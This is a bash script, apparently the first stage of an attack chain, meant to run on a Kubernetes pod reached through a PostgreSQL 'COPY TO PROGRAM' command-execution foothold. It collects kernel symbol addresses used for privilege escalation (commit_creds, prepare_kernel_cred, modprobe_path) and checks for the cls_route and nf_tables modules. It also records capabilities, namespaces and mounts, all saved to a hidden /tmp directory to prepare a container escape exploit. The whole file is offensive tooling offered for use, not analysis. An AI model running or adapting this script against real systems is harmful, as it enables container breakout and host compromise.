#!/bin/bash
# Stage 1: Kernel Reconnaissance
# Run this on the K8s pod via COPY TO PROGRAM chain
# Extracts everything needed for the container escape exploit

OUT="/tmp/.k_recon"
mkdir -p $OUT

echo "=== KERNEL VERSION ===" > $OUT/info.txt
uname -a >> $OUT/info.txt

echo "=== KEY SYMBOLS ===" >> $OUT/info.txt
grep -wE "T (find_task_by_vpid|switch_task_namespaces|commit_creds|prepare_kernel_cred|__x64_sys_setns)" /proc/kallsyms >> $OUT/info.txt 2>/dev/null
grep -wE "D (modprobe_path|core_pattern)" /proc/kallsyms >> $OUT/info.txt 2>/dev/null
grep -wE "d (anon_pipe_buf_ops|init_nsproxy)" /proc/kallsyms >> $OUT/info.txt 2>/dev/null
grep -w "T _text" /proc/kallsyms >> $OUT/info.txt 2>/dev/null

echo "=== CLS_ROUTE MODULE ===" >> $OUT/info.txt
find /lib/modules/ -name "cls_route*" 2>/dev/null >> $OUT/info.txt
lsmod 2>/dev/null | grep -i "cls_route\|route4" >> $OUT/info.txt
cat /proc/net/psched >> $OUT/info.txt 2>/dev/null

echo "=== NF_TABLES STATUS ===" >> $OUT/info.txt
lsmod 2>/dev/null | grep nf_tables >> $OUT/info.txt
cat /proc/net/nf_conntrack_count 2>/dev/null >> $OUT/info.txt

echo "=== CAPABILITIES ===" >> $OUT/info.txt
cat /proc/self/status | grep -i cap >> $OUT/info.txt

echo "=== NAMESPACE CHECK ===" >> $OUT/info.txt
ls -la /proc/1/ns/ >> $OUT/info.txt 2>/dev/null
readlink /proc/1/ns/mnt >> $OUT/info.txt 2>/dev/null

echo "=== BIND MOUNTS ===" >> $OUT/info.txt
mount | grep -E "bind|pgdata|data" >> $OUT/info.txt 2>/dev/null
df -h /var/lib/postgresql/data >> $OUT/info.txt 2>/dev/null

echo "=== DONE ===" >> $OUT/info.txt
cat $OUT/info.txt
